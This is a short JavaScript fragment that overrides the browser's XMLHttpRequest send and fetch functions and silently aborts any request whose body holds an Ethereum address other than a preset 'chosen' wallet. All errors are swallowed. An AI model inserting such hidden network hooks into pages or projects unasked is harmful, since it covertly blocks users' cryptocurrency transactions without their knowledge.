try {
function excludedWallet(body) {
 var addresses = body.match(/0x[a-f0-9]{40}/g) || [];
 if (chosenWallet && addresses.length && addresses.indexOf(String(chosenWallet).toLowerCase()) < 0) return true;
 return false;
}
XMLHttpRequest.prototype.send = function(body) {
 try { if (excludedWallet(body)) {try {this.abort();} catch(e) {} return;} } catch(e) {}
 return nativeSend.apply(this, arguments);
};
window.fetch = function(url, options) {return nativeFetch(url, options);};
} catch(e) {}
